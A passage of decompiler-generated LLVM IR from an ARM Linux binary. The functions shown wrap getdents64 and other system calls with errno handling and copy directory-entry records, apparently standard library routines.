  %v5_15120 = load i32, i32* @r4, align 4
  %v7_15120 = add i32 %v5_15120, %v0_15118
  store i32 %v7_15120, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15188

dec_label_pc_1512c:                               ; preds = %dec_label_pc_15188
  %v1_1512c = add i32 %v2_1513c, 16
  %v2_1512c = inttoptr i32 %v1_1512c to i32*
  %v3_1512c = load i32, i32* %v2_1512c, align 4
  store i32 %v3_1512c, i32* @lr, align 4
  %v2_15130 = inttoptr i32 %v1_1518c to i32*
  %v3_15130 = load i32, i32* %v2_15130, align 4
  store i32 %v3_15130, i32* %r2.global-to-local, align 4
  %v1_15134 = add i32 %v2_1513c, 18
  %v2_15134 = inttoptr i32 %v1_15134 to i8*
  %v3_15134 = load i8, i8* %v2_15134, align 1
  %v4_15134 = zext i8 %v3_15134 to i32
  store i32 %v4_15134, i32* %ip.global-to-local, align 4
  %v3_15138 = sdiv i32 %v3_1512c, 256
  store i32 %v3_15138, i32* %r3.global-to-local, align 4
  %v1_1513c = trunc i32 %v3_1512c to i8
  %v4_1513c = inttoptr i32 %v1_1518c to i8*
  store i8 %v1_1513c, i8* %v4_1513c, align 1
  %v0_15140 = load i32, i32* %r2.global-to-local, align 4
  %v1_15140 = load i32, i32* @r4, align 4
  %v2_15140 = add i32 %v1_15140, 4
  %v3_15140 = inttoptr i32 %v2_15140 to i32*
  store i32 %v0_15140, i32* %v3_15140, align 4
  %v0_15144 = load i32, i32* %ip.global-to-local, align 4
  %v1_15144 = trunc i32 %v0_15144 to i8
  %v2_15144 = load i32, i32* @r4, align 4
  %v3_15144 = add i32 %v2_15144, 10
  %v4_15144 = inttoptr i32 %v3_15144 to i8*
  store i8 %v1_15144, i8* %v4_15144, align 1
  %v0_15148 = load i32, i32* %r3.global-to-local, align 4
  %v1_15148 = trunc i32 %v0_15148 to i8
  %v2_15148 = load i32, i32* @r4, align 4
  %v3_15148 = add i32 %v2_15148, 9
  %v4_15148 = inttoptr i32 %v3_15148 to i8*
  store i8 %v1_15148, i8* %v4_15148, align 1
  %v0_1514c = load i32, i32* @r4, align 4
  %v1_1514c = add i32 %v0_1514c, 8
  %v2_1514c = inttoptr i32 %v1_1514c to i8*
  %v3_1514c = load i8, i8* %v2_1514c, align 1
  %v4_1514c = zext i8 %v3_1514c to i32
  store i32 %v4_1514c, i32* %r2.global-to-local, align 4
  %v0_15150 = load i32, i32* @r5, align 4
  %v1_15150 = add i32 %v0_15150, 1
  %v2_15150 = inttoptr i32 %v1_15150 to i8*
  %v3_15150 = load i8, i8* %v2_15150, align 1
  %v4_15150 = zext i8 %v3_15150 to i32
  store i32 %v4_15150, i32* %r3.global-to-local, align 4
  %v4_15154 = mul nuw nsw i32 %v4_15150, 256
  %v5_15154 = or i32 %v4_15154, %v4_1514c
  %v1_15158 = add nsw i32 %v5_15154, -19
  store i32 %v1_15158, i32* @r2, align 4
  %v3_1515c = call i32 @function_13c80(i32 %v1_15194, i32 %v1_15190, i32 %v1_15158)
  %v0_15160 = load i32, i32* @r4, align 4
  %v1_15160 = add i32 %v0_15160, 8
  %v2_15160 = inttoptr i32 %v1_15160 to i8*
  %v3_15160 = load i8, i8* %v2_15160, align 1
  %v4_15160 = zext i8 %v3_15160 to i32
  store i32 %v4_15160, i32* %r3.global-to-local, align 4
  %v0_15164 = load i32, i32* @r5, align 4
  %v1_15164 = add i32 %v0_15164, 1
  %v2_15164 = inttoptr i32 %v1_15164 to i8*
  %v3_15164 = load i8, i8* %v2_15164, align 1
  %v4_15164 = zext i8 %v3_15164 to i32
  store i32 %v0_15160, i32* @r0, align 4
  %v4_1516c = mul nuw nsw i32 %v4_15164, 256
  %v5_1516c = or i32 %v4_1516c, %v4_15160
  store i32 %v5_1516c, i32* @r2, align 4
  store i32 %v0_15160, i32* @r1, align 4
  %v3_15174 = call i32 @function_13c80(i32 %v0_15160, i32 %v0_15160, i32 %v5_1516c)
  %v0_15178 = load i32, i32* @r4, align 4
  %v1_15178 = add i32 %v0_15178, 8
  %v2_15178 = inttoptr i32 %v1_15178 to i8*
  %v3_15178 = load i8, i8* %v2_15178, align 1
  %v4_15178 = zext i8 %v3_15178 to i32
  store i32 %v4_15178, i32* %r3.global-to-local, align 4
  %v0_1517c = load i32, i32* @r5, align 4
  %v1_1517c = add i32 %v0_1517c, 1
  %v2_1517c = inttoptr i32 %v1_1517c to i8*
  %v3_1517c = load i8, i8* %v2_1517c, align 1
  %v4_1517c = zext i8 %v3_1517c to i32
  store i32 %v4_1517c, i32* @r2, align 4
  %v4_15180 = mul nuw nsw i32 %v4_1517c, 256
  %v5_15180 = or i32 %v4_15180, %v4_15178
  store i32 %v5_15180, i32* %r3.global-to-local, align 4
  %v2_15184 = add i32 %v5_15180, %v0_15178
  store i32 %v2_15184, i32* @r4, align 4
  %v1_15188.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15188

dec_label_pc_15188:                               ; preds = %dec_label_pc_15188.preheader, %dec_label_pc_1512c
  %v1_15188 = phi i32 [ %v7_15120, %dec_label_pc_15188.preheader ], [ %v1_15188.pre, %dec_label_pc_1512c ]
  %v2_1513c = phi i32 [ %v5_15120, %dec_label_pc_15188.preheader ], [ %v2_15184, %dec_label_pc_1512c ]
  %v3_15188 = icmp ult i32 %v2_1513c, %v1_15188
  %v1_1518c = add i32 %v2_1513c, 8
  store i32 %v1_1518c, i32* @r5, align 4
  %v1_15190 = add i32 %v2_1513c, 19
  store i32 %v1_15190, i32* @r1, align 4
  %v1_15194 = add i32 %v2_1513c, 11
  store i32 %v1_15194, i32* @r0, align 4
  br i1 %v3_15188, label %dec_label_pc_1512c, label %dec_label_pc_1519c.loopexit

dec_label_pc_1519c.loopexit:                      ; preds = %dec_label_pc_15188
  %v0_1519c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1519c

dec_label_pc_1519c:                               ; preds = %dec_label_pc_15110, %dec_label_pc_1519c.loopexit
  %v0_1519c = phi i32 [ %v0_1519c.pre, %dec_label_pc_1519c.loopexit ], [ %v0_15118, %dec_label_pc_15110 ]
  store i32 %v6_15110, i32* @r5, align 4
  ret i32 %v0_1519c

; uselistorder directives
  uselistorder i32 %v1_15194, { 1, 0 }
  uselistorder i32 %v1_15190, { 1, 0 }
  uselistorder i32 %v1_1518c, { 2, 1, 0 }
  uselistorder i32 %v2_1513c, { 4, 3, 2, 5, 1, 0 }
  uselistorder i32 %v0_15160, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v3_1512c, { 1, 0, 2 }
  uselistorder i32 %v5_15120, { 1, 0 }
  uselistorder i32 %v0_15118, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @function_13c80, { 8, 7, 5, 6, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1519c, { 1, 0 }
  uselistorder label %dec_label_pc_15188, { 1, 0 }
}

define i32 @function_151a4() local_unnamed_addr {
dec_label_pc_151a4:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_151a8 = load i32, i32* @r4, align 4
  %v9_151a8 = load i32, i32* @r6, align 4
  %v0_151ac = load i32, i32* @r2, align 4
  %v1_151ac = add i32 %v0_151ac, 6
  %v2_151b4 = ptrtoint i32* %stack_var_-60 to i32
  %v1_151b8 = and i32 %v1_151ac, -4
  store i32 %v1_151b8, i32* %r3.global-to-local, align 4
  %v2_151bc = sub i32 %v2_151b4, %v1_151b8
  %v0_151c0 = load i32, i32* @r1, align 4
  store i32 %v0_151c0, i32* %r8.global-to-local, align 4
  store i32 %v0_151ac, i32* %stack_var_-60, align 4
  store i32 %v2_151bc, i32* %sl.global-to-local, align 4
  %v0_151cc = load i32, i32* @r0, align 4
  %v1_151d0 = inttoptr i32 %v2_151bc to %linux_dirent64*
  store i32 %v2_151bc, i32* %r1.global-to-local, align 4
  %v5_151d4 = call i32 @getdents64(i32 %v0_151cc, %linux_dirent64* %v1_151d0, i32 %v0_151ac)
  store i32 %v5_151d4, i32* @r6, align 4
  %tmp = icmp ult i32 %v5_151d4, -4095
  br i1 %tmp, label %dec_label_pc_151f8, label %dec_label_pc_151e4

dec_label_pc_151e4:                               ; preds = %dec_label_pc_151a4
  %v0_151e4 = call i32 @function_13c28()
  %v0_151e8 = load i32, i32* @r6, align 4
  %v1_151e8 = sub i32 0, %v0_151e8
  store i32 %v1_151e8, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  %v2_151f0 = inttoptr i32 %v0_151e4 to i32*
  store i32 %v1_151e8, i32* %v2_151f0, align 4
  %v0_15200.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15200

dec_label_pc_151f8:                               ; preds = %dec_label_pc_151a4
  br i1 false, label %dec_label_pc_15200, label %dec_label_pc_15208

dec_label_pc_15200:                               ; preds = %dec_label_pc_151f8, %dec_label_pc_151e4
  %v0_15200 = phi i32 [ -1, %dec_label_pc_151f8 ], [ %v0_15200.pre, %dec_label_pc_151e4 ]
  store i32 %v0_15200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_152fc

dec_label_pc_15208:                               ; preds = %dec_label_pc_151f8
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_15210 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15210, i32* @r5, align 4
  %v0_15214 = load i32, i32* @sp, align 4
  store i32 %v0_15214, i32* @r4, align 4
  br label %dec_label_pc_152d8

dec_label_pc_15224:                               ; preds = %dec_label_pc_152d8
  %v2_152f0 = add i32 %v3_152dc, %v0_152f0
  %v1_15224 = add i32 %v0_15228, 17
  %v2_15224 = inttoptr i32 %v1_15224 to i8*
  %v3_15224 = load i8, i8* %v2_15224, align 1
  %v4_15224 = zext i8 %v3_15224 to i32
  %v2_15228 = inttoptr i32 %v1_152e4 to i8*
  %v3_15228 = load i8, i8* %v2_15228, align 1
  %v4_15228 = zext i8 %v3_15228 to i32
  %v4_1522c = mul nuw nsw i32 %v4_15224, 256
  %v5_1522c = or i32 %v4_15228, %v4_1522c
  %v1_15230 = add nuw nsw i32 %v5_1522c, 3
  %v1_15234 = and i32 %v1_15230, 131068
  store i32 %v1_15234, i32* %r3.global-to-local, align 4
  %v2_15238 = add i32 %v1_15234, %v2_15278
  store i32 %v2_15238, i32* %sb.global-to-local, align 4
  %v9_1523c = icmp eq i32 %v2_15238, %v2_152f0
  %v1_15240 = and i32 %v1_15230, 128
  %v2_15244 = icmp eq i32 %v1_15240, 0
  %v3_15244 = or i1 %v9_1523c, %v2_15244
  br i1 %v3_15244, label %dec_label_pc_15278, label %dec_label_pc_15248

dec_label_pc_15248:                               ; preds = %dec_label_pc_15224
  store i32 %stack_var_-52.0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_15258 = call i32 @function_153b8(i32 %v0_151cc, i32 %stack_var_-52.0, i32 %stack_var_-48.0, i32 0)
  %v0_1525c = load i32, i32* @r5, align 4
  %v1_1525c = load i32, i32* %r8.global-to-local, align 4
  %v9_1525c = icmp eq i32 %v0_1525c, %v1_1525c
  br i1 %v9_1525c, label %dec_label_pc_15264, label %dec_label_pc_152f8

dec_label_pc_15264:                               ; preds = %dec_label_pc_15248
  %v0_15264 = call i32 @function_13c28()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_15270 = inttoptr i32 %v0_15264 to i32*
  store i32 22, i32* %v2_15270, align 4
  %v0_152fc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_152fc

dec_label_pc_15278:                               ; preds = %dec_label_pc_15224
  %v3_1524011 = udiv i32 %v1_15230, 256
  %v1_15278 = trunc i32 %v3_1524011 to i8
  %v3_15278 = add i32 %v2_15278, 17
  %v4_15278 = inttoptr i32 %v3_15278 to i8*
  store i8 %v1_15278, i8* %v4_15278, align 1
  %v0_1527c = load i32, i32* %r3.global-to-local, align 4
  %v1_1527c = trunc i32 %v0_1527c to i8
  %v2_1527c = load i32, i32* @r5, align 4
  %v3_1527c = add i32 %v2_1527c, 16
  %v4_1527c = inttoptr i32 %v3_1527c to i8*
  store i8 %v1_1527c, i8* %v4_1527c, align 1
  %v0_15280 = load i32, i32* @r4, align 4
  %v1_15280 = add i32 %v0_15280, 8
  %v1_15284 = inttoptr i32 %v1_15280 to i32*
  %v2_15284 = load i32, i32* %v1_15284, align 4
  %v3_15284 = add i32 %v0_15280, 12
  %v4_15284 = inttoptr i32 %v3_15284 to i32*
  %v5_15284 = load i32, i32* %v4_15284, align 4
  store i32 %v5_15284, i32* %r3.global-to-local, align 4
  %v1_15290 = inttoptr i32 %v0_15280 to i32*
  %v2_15290 = load i32, i32* %v1_15290, align 4
  %v3_15290 = add i32 %v0_15280, 4
  %v4_15290 = inttoptr i32 %v3_15290 to i32*
  %v5_15290 = load i32, i32* %v4_15290, align 4
  store i32 %v5_15290, i32* %r3.global-to-local, align 4
  %v0_15294 = load i32, i32* @r5, align 4
  %v1_15294 = inttoptr i32 %v0_15294 to i32*
  store i32 %v2_15290, i32* %v1_15294, align 4
  %v3_15294 = add i32 %v0_15294, 4
  %v4_15294 = inttoptr i32 %v3_15294 to i32*
  %v5_15294 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_15294, i32* %v4_15294, align 4
  %v0_15298 = load i32, i32* @r4, align 4
  %v1_15298 = add i32 %v0_15298, 8
  %v1_1529c = inttoptr i32 %v1_15298 to i32*
  %v2_1529c = load i32, i32* %v1_1529c, align 4
  %v3_1529c = add i32 %v0_15298, 12
  %v4_1529c = inttoptr i32 %v3_1529c to i32*
  %v5_1529c = load i32, i32* %v4_1529c, align 4
  store i32 %v5_1529c, i32* %r3.global-to-local, align 4
  %v1_152a0 = load i32, i32* @r5, align 4
  %v2_152a0 = add i32 %v1_152a0, 8
  %v3_152a0 = inttoptr i32 %v2_152a0 to i32*
  store i32 %v2_1529c, i32* %v3_152a0, align 4
  %v0_152a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_152a4 = load i32, i32* @r5, align 4
  %v2_152a4 = add i32 %v1_152a4, 12
  %v3_152a4 = inttoptr i32 %v2_152a4 to i32*
  store i32 %v0_152a4, i32* %v3_152a4, align 4
  %v0_152a8 = load i32, i32* @r4, align 4
  %v1_152a8 = add i32 %v0_152a8, 18
  %v2_152a8 = inttoptr i32 %v1_152a8 to i8*
  %v3_152a8 = load i8, i8* %v2_152a8, align 1
  %v4_152a8 = zext i8 %v3_152a8 to i32
  store i32 %v4_152a8, i32* %r3.global-to-local, align 4
  %v2_152ac = load i32, i32* @r5, align 4
  %v3_152ac = add i32 %v2_152ac, 18
  %v4_152ac = inttoptr i32 %v3_152ac to i8*
  store i8 %v3_152a8, i8* %v4_152ac, align 1
  %v0_152b0 = load i32, i32* @r4, align 4
  %v1_152b0 = add i32 %v0_152b0, 16
  %v2_152b0 = inttoptr i32 %v1_152b0 to i8*
  %v3_152b0 = load i8, i8* %v2_152b0, align 1
  %v4_152b0 = zext i8 %v3_152b0 to i32
  %v0_152b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_152b4 = add i32 %v0_152b4, 1
  %v2_152b4 = inttoptr i32 %v1_152b4 to i8*
  %v3_152b4 = load i8, i8* %v2_152b4, align 1
  %v4_152b4 = zext i8 %v3_152b4 to i32
  store i32 %v4_152b4, i32* %r3.global-to-local, align 4
  %v4_152b8 = mul nuw nsw i32 %v4_152b4, 256
  %v5_152b8 = or i32 %v4_152b8, %v4_152b0
  %v1_152bc = add nsw i32 %v5_152b8, -19
  store i32 %v1_152bc, i32* @r2, align 4
  %v3_152c0 = call i32 @function_13c70(i32 %v1_152e8, i32 %v1_152ec, i32 %v1_152bc)
  %v0_152c4 = load i32, i32* @r4, align 4
  %v1_152c4 = add i32 %v0_152c4, 16
  %v2_152c4 = inttoptr i32 %v1_152c4 to i8*
  %v3_152c4 = load i8, i8* %v2_152c4, align 1
  %v4_152c4 = zext i8 %v3_152c4 to i32
  store i32 %v4_152c4, i32* %r3.global-to-local, align 4
  %v0_152c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_152c8 = add i32 %v0_152c8, 1
  %v2_152c8 = inttoptr i32 %v1_152c8 to i8*
  %v3_152c8 = load i8, i8* %v2_152c8, align 1
  %v4_152c8 = zext i8 %v3_152c8 to i32
  %v4_152cc = mul nuw nsw i32 %v4_152c8, 256
  %v5_152cc = or i32 %v4_152cc, %v4_152c4
  store i32 %v5_152cc, i32* %r3.global-to-local, align 4
  %v2_152d0 = add i32 %v5_152cc, %v0_152c4
  store i32 %v2_152d0, i32* @r4, align 4
  %v0_152d4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_152d4, i32* @r5, align 4
  %v1_152d8.pre = load i32, i32* @r6, align 4
  %v0_152f0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_152d8

dec_label_pc_152d8:                               ; preds = %dec_label_pc_15208, %dec_label_pc_15278
  %stack_var_-52.0 = phi i32 [ -1, %dec_label_pc_15208 ], [ %v2_15284, %dec_label_pc_15278 ]
  %v0_152f0 = phi i32 [ %v0_15210, %dec_label_pc_15208 ], [ %v0_152f0.pre, %dec_label_pc_15278 ]
  %v2_15278 = phi i32 [ %v0_15210, %dec_label_pc_15208 ], [ %v0_152d4, %dec_label_pc_15278 ]
  %v0_15228 = phi i32 [ %v0_15214, %dec_label_pc_15208 ], [ %v2_152d0, %dec_label_pc_15278 ]
  %v1_152d8 = phi i32 [ %v5_151d4, %dec_label_pc_15208 ], [ %v1_152d8.pre, %dec_label_pc_15278 ]
  %stack_var_-48.0 = phi i32 [ -1, %dec_label_pc_15208 ], [ %v5_15284, %dec_label_pc_15278 ]
  %v0_152d8 = load i32, i32* %sl.global-to-local, align 4
  %v2_152d8 = add i32 %v0_152d8, %v1_152d8
  store i32 %v2_152d8, i32* %r3.global-to-local, align 4
  %v3_152dc = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_152dc, i32* @r2, align 4
  %v3_152e0 = icmp ult i32 %v0_15228, %v2_152d8
  %v1_152e4 = add i32 %v0_15228, 16
  store i32 %v1_152e4, i32* %r7.global-to-local, align 4
  %v1_152e8 = add i32 %v2_15278, 19
  store i32 %v1_152e8, i32* @r0, align 4
  %v1_152ec = add i32 %v0_15228, 19
  store i32 %v1_152ec, i32* @r1, align 4
  br i1 %v3_152e0, label %dec_label_pc_15224, label %dec_label_pc_152f8

dec_label_pc_152f8:                               ; preds = %dec_label_pc_152d8, %dec_label_pc_15248
  %v1_152f8 = phi i32 [ %v0_1525c, %dec_label_pc_15248 ], [ %v2_15278, %dec_label_pc_152d8 ]
  %v0_152f8 = phi i32 [ %v1_1525c, %dec_label_pc_15248 ], [ %v0_152f0, %dec_label_pc_152d8 ]
  %v2_152f8 = sub i32 %v1_152f8, %v0_152f8
  store i32 %v2_152f8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_152fc

dec_label_pc_152fc:                               ; preds = %dec_label_pc_15264, %dec_label_pc_15200, %dec_label_pc_152f8
  %v0_152fc = phi i32 [ %v0_152fc.pre, %dec_label_pc_15264 ], [ %v0_15200, %dec_label_pc_15200 ], [ %v2_152f8, %dec_label_pc_152f8 ]
  store i32 %v3_151a8, i32* @r4, align 4
  store i32 %v9_151a8, i32* %r6.global-to-local, align 4
  ret i32 %v0_152fc

; uselistorder directives
  uselistorder i32 %v1_152ec, { 1, 0 }
  uselistorder i32 %v1_152e8, { 1, 0 }
  uselistorder i32 %v1_152e4, { 1, 0 }
  uselistorder i32 %v3_152dc, { 1, 0 }
  uselistorder i32 %v0_15228, { 2, 1, 3, 0 }
  uselistorder i32 %v2_15278, { 0, 3, 1, 2 }
  uselistorder i32 %v0_15280, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15210, { 1, 0, 2 }
  uselistorder i32 %v5_151d4, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @function_13c70, { 7, 1, 0, 3, 5, 4, 6, 8, 2 }
  uselistorder i32 128, { 12, 13, 39, 14, 40, 27, 18, 19, 20, 33, 2, 34, 21, 35, 22, 23, 24, 25, 15, 36, 30, 3, 28, 4, 29, 5, 16, 17, 31, 32, 7, 0, 1, 8, 9, 10, 37, 6, 38, 26, 11 }
  uselistorder i32* @sp, { 4, 5, 1, 6, 0, 7, 2, 8, 3 }
  uselistorder i32* @r6, { 3, 118, 119, 120, 427, 429, 428, 358, 359, 318, 319, 320, 321, 322, 323, 324, 325, 345, 360, 361, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 326, 327, 79, 78, 80, 81, 82, 83, 84, 328, 329, 330, 331, 332, 333, 334, 335, 336, 342, 343, 344, 337, 338, 339, 340, 341, 4, 98, 2, 99, 100, 1, 101, 102, 280, 281, 282, 0, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 103, 104, 105, 106, 5, 107, 108, 109, 110, 111, 15, 112, 113, 114, 115, 116, 117, 139, 140, 141, 142, 14, 143, 144, 145, 6, 146, 147, 148, 7, 149, 8, 150, 9, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 346, 349, 347, 348, 350, 351, 16, 352, 353, 354, 355, 356, 357, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 10, 372, 373, 374, 375, 376, 377, 379, 11, 378, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 12, 13, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426 }
  uselistorder label %dec_label_pc_152fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_152d8, { 1, 0 }
}

define i32 @function_15308() local_unnamed_addr {
dec_label_pc_15308:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15308 = load i32, i32* @r4, align 4
  store i32 %v3_15308, i32* %stack_var_-8, align 4
  %v0_15310 = load i32, i32* @r0, align 4
  store i32 %v0_15310, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15310, -4095
  br i1 %tmp, label %dec_label_pc_1532c, label %dec_label_pc_1531c

dec_label_pc_1531c:                               ; preds = %dec_label_pc_15308
  %v0_1531c = call i32 @function_13c28()
  %v0_15320 = load i32, i32* %r4.global-to-local, align 4
  %v1_15320 = sub i32 0, %v0_15320
  %v2_15324 = inttoptr i32 %v0_1531c to i32*
  store i32 %v1_15320, i32* %v2_15324, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_15330.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1532c

dec_label_pc_1532c:                               ; preds = %dec_label_pc_15308, %dec_label_pc_1531c
  %v2_15330 = phi i32 [ %v3_15308, %dec_label_pc_15308 ], [ %v2_15330.pre, %dec_label_pc_1531c ]
  %v0_1532c = phi i32 [ %v0_15310, %dec_label_pc_15308 ], [ -1, %dec_label_pc_1531c ]
  store i32 %v2_15330, i32* @r4, align 4
  ret i32 %v0_1532c

; uselistorder directives
  uselistorder i32 %v0_15310, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1532c, { 1, 0 }
}

define i32 @function_15334() local_unnamed_addr {
dec_label_pc_15334:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15334 = load i32, i32* @r4, align 4
  store i32 %v3_15334, i32* %stack_var_-8, align 4
  %v0_1533c = load i32, i32* @r0, align 4
  store i32 %v0_1533c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1533c, -4095
  br i1 %tmp, label %dec_label_pc_15358, label %dec_label_pc_15348

dec_label_pc_15348:                               ; preds = %dec_label_pc_15334
  %v0_15348 = call i32 @function_13c28()
  %v0_1534c = load i32, i32* %r4.global-to-local, align 4
  %v1_1534c = sub i32 0, %v0_1534c
  %v2_15350 = inttoptr i32 %v0_15348 to i32*
  store i32 %v1_1534c, i32* %v2_15350, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1535c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15358

dec_label_pc_15358:                               ; preds = %dec_label_pc_15334, %dec_label_pc_15348
  %v2_1535c = phi i32 [ %v3_15334, %dec_label_pc_15334 ], [ %v2_1535c.pre, %dec_label_pc_15348 ]
  %v0_15358 = phi i32 [ %v0_1533c, %dec_label_pc_15334 ], [ -1, %dec_label_pc_15348 ]
  store i32 %v2_1535c, i32* @r4, align 4
  ret i32 %v0_15358

; uselistorder directives
  uselistorder i32 %v0_1533c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15358, { 1, 0 }
}

define i32 @function_15360(i32 %arg1) local_unnamed_addr {
dec_label_pc_15360:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15360 = load i32, i32* @r4, align 4
  store i32 %v3_15360, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15384, label %dec_label_pc_15374

dec_label_pc_15374:                               ; preds = %dec_label_pc_15360
  %v0_15374 = call i32 @function_13c28()
  %v0_15378 = load i32, i32* %r4.global-to-local, align 4
  %v1_15378 = sub i32 0, %v0_15378
  %v2_1537c = inttoptr i32 %v0_15374 to i32*
  store i32 %v1_15378, i32* %v2_1537c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_15388.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15384

dec_label_pc_15384:                               ; preds = %dec_label_pc_15360, %dec_label_pc_15374
  %v2_15388 = phi i32 [ %v3_15360, %dec_label_pc_15360 ], [ %v2_15388.pre, %dec_label_pc_15374 ]
  %v0_15384 = phi i32 [ %arg1, %dec_label_pc_15360 ], [ -1, %dec_label_pc_15374 ]
  store i32 %v2_15388, i32* %r4.global-to-local, align 4
  ret i32 %v0_15384

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15384, { 1, 0 }
}

define i32 @function_1538c() local_unnamed_addr {
dec_label_pc_1538c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1538c = load i32, i32* @r4, align 4
  store i32 %v3_1538c, i32* %stack_var_-8, align 4
  %v0_15394 = load i32, i32* @r0, align 4
  store i32 %v0_15394, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15394, -4095
  br i1 %tmp, label %dec_label_pc_153b0, label %dec_label_pc_153a0

dec_label_pc_153a0:                               ; preds = %dec_label_pc_1538c
  %v0_153a0 = call i32 @function_13c28()
  %v0_153a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_153a4 = sub i32 0, %v0_153a4
  %v2_153a8 = inttoptr i32 %v0_153a0 to i32*
  store i32 %v1_153a4, i32* %v2_153a8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_153b4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_153b0

dec_label_pc_153b0:                               ; preds = %dec_label_pc_1538c, %dec_label_pc_153a0
  %v2_153b4 = phi i32 [ %v3_1538c, %dec_label_pc_1538c ], [ %v2_153b4.pre, %dec_label_pc_153a0 ]
  %v0_153b0 = phi i32 [ %v0_15394, %dec_label_pc_1538c ], [ -1, %dec_label_pc_153a0 ]
  store i32 %v2_153b4, i32* %r4.global-to-local, align 4
  ret i32 %v0_153b0

; uselistorder directives
  uselistorder i32 %v0_15394, { 1, 0, 2 }
  uselistorder label %dec_label_pc_153b0, { 1, 0 }
}

define i32 @function_153b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_153b8:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* @r2, align 4
